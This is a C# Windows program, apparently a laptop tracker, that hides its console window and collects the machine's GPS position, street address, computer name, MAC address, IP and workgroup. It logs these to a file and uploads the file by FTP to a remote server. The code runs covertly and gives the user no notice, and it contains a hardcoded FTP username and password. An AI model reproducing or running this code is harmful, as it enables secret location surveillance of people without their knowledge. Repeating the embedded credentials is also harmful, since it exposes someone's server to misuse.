using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml;
using System.Device.Location;
using System.Windows.Forms;
using System.Management;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GPS
{
    
   class Program
   {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        static int SW_SHOW = 5;
        static int SW_HIDE = 0;
        public static string coordinate;
        static string errorLine;
        static string prgName = Application.ProductName;
        static string MAC;
        static string IP;
        static string pcadi;
        static string work;
        static string gpstxt = "gps.txt";
        static string ftpUser = "enesvekadir";
        static string ftpPass = "enes++52";
        static string ftpDizin = "ftp://ftp.enesvekadir.com/public_html/Logs/";
        public static string file_path ;
        public static Boolean GetLoc=false;
        static string winDir;
        static char winDirShortVersion;
        private static Process[] pname;
        private static string appName = Application.ExecutablePath;
        static void Main(string[] args)
        {
            char t='\\';
            string[] words = appName.Split(t);
            pname = Process.GetProcessesByName(words.Last());
            if (pname.Length == 0)
            {
                //Yapılacaklar
                var handle = GetConsoleWindow();
                //Gizle
                ShowWindow(handle, SW_HIDE);

                // Göster
                //ShowWindow(handle, SW_SHOW);

                winDir = Convert.ToString(Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.System)));
                winDirShortVersion = winDir.FirstOrDefault();
                file_path = @winDirShortVersion + @":\n0kayip\Logs\gps.txt";
                pcadi = SystemInformation.ComputerName;
                pcadi = pcadi.Replace("Ç", "C");
                pcadi = pcadi.Replace("Ü", "U");
                pcadi = pcadi.Replace("İ", "I");
                pcadi = pcadi.Replace("Ö", "O");
                pcadi = pcadi.Replace("Ş", "S");
                pcadi = pcadi.Replace(" ", "_");
                pcadi = pcadi.Replace("ç", "c");
                pcadi = pcadi.Replace("ü", "u");
                pcadi = pcadi.Replace("ı", "i");
                pcadi = pcadi.Replace("ö", "o");
                pcadi = pcadi.Replace("ş", "s");
                MAC = Mac();
                IP = IPAd();
                ManagementObjectSearcher mos =
                   new ManagementObjectSearcher(@"root\CIMV2", @"SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject mo in mos.Get())
                {
                    //Console.Write(" WorkGroup= ");
                    work = mo["Workgroup"].ToString();
                }
                GeoCoordinateWatcher watcher = new GeoCoordinateWatcher();
                watcher.PositionChanged += Watcher_PositionChanged;
                watcher.Start();
                System.Threading.Thread.Sleep(3000);
                coordinate = coordinate.Replace(@",", @".");
                coordinate = coordinate.Replace(@"-", @",");

                XmlDocument xDoc = new XmlDocument();
                xDoc.Load("https://maps.googleapis.com/maps/api/geocode/xml?latlng=" + coordinate);
                XmlNodeList xNodelst = xDoc.GetElementsByTagName("result");
                XmlNode xNode = xNodelst.Item(0);
                Console.WriteLine(coordinate);
                string FullAddress = xNode.SelectSingleNode("formatted_address").InnerText;
                /*
                        string Number = xNode.SelectSingleNode("address_component[1]/long_name").InnerText;
                        string Street = xNode.SelectSingleNode("address_component[2]/long_name").InnerText;
                        string Village = xNode.SelectSingleNode("address_component[3]/long_name").InnerText;
                        string Area = xNode.SelectSingleNode("address_component[4]/long_name").InnerText;
                        string County = xNode.SelectSingleNode("address_component[5]/long_name").InnerText;
                        string State = xNode.SelectSingleNode("address_component[6]/long_name").InnerText;
                        string Zip = xNode.SelectSingleNode("address_component[8]/long_name").InnerText;
                        string Country = xNode.SelectSingleNode("address_component[7]/long_name").InnerText;
                        */
                System.IO.File.AppendAllText(file_path, "Koordiant: " + coordinate + Environment.NewLine);
                System.IO.File.AppendAllText(file_path, "Tarih: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + Environment.NewLine);
                System.IO.File.AppendAllText(file_path, "Tam Adres: " + FullAddress + Environment.NewLine);
                /*  System.IO.File.AppendAllText(file_path, "Numara: " + Number + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "Sokak: " + Street + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "İl: " + Village + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "Mahalle: " + Area + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "İlçe: " + County + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "Eyalet: " + State + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "Posta Kodu: " + Zip + Environment.NewLine);
                  System.IO.File.AppendAllText(file_path, "Ülke: " + Country + Environment.NewLine);
              */


                /*   errorLine = "IP: " + IP + Environment.NewLine + "MAC: " + MAC + Environment.NewLine + "WORKGROUP: " + work + Environment.NewLine
                     + "PC: " + pcadi + Environment.NewLine + "Hata: " + Exc.Message + Environment.NewLine + "Program: " + prgName + Environment.NewLine
                     + "Tarih: " + DateTime.Now.ToString() + Environment.NewLine + "------------------------------------";
                   string file_path = @winDirShortVersion + @":\n0kayip\Logs\error_log.txt";
                   System.IO.File.AppendAllText(file_path, errorLine);
               */
                using (WebClient client = new WebClient())
                {
                    client.Credentials = new NetworkCredential(ftpUser, ftpPass);
                    client.UploadFile(ftpDizin + gpstxt, "STOR", @winDirShortVersion + @":\n0kayip\Logs\" + gpstxt);
                }

                Application.Exit();
            }
            else
            {
            Application.Exit();
            }
             
        }
        public static string IPAd()
        {
            string externalIP = "";
            externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
            externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")).Matches(externalIP)[0].ToString();
            return externalIP;
        }
        private static string Mac()
        {
            try
            {
                //Console.WriteLine("Mac");
                ManagementClass manager = new ManagementClass("Win32_NetworkAdapterConfiguration");
                foreach (ManagementObject obj in manager.GetInstances())
                {
                    if ((bool)obj["IPEnabled"])
                    {
                        return obj["MacAddress"].ToString();
                    }
                }
            }
            catch (Exception Exc)
            {
                errorLine = "IP: " + IP + Environment.NewLine + "MAC: " + MAC + Environment.NewLine + "WORKGROUP: " + work + Environment.NewLine
                    + "PC: " + pcadi + Environment.NewLine + "Hata: " + Exc.Message + Environment.NewLine + "Program: " + prgName + Environment.NewLine
                    + "Tarih: " + DateTime.Now.ToString() + Environment.NewLine + "------------------------------------" + Environment.NewLine;
                string file_path = @winDirShortVersion + @":\n0kayip\Logs\error_log.txt";
                Process.Start(@winDirShortVersion + @":\n0kayip\GPS.exe");
                System.IO.File.AppendAllText(file_path, errorLine);
            }
            return String.Empty;
        }
        public static void Watcher_PositionChanged(object sender, GeoPositionChangedEventArgs<GeoCoordinate> e)
        {
            coordinate=e.Position.Location.Latitude+"-"+e.Position.Location.Longitude;
        }
        
    }
}
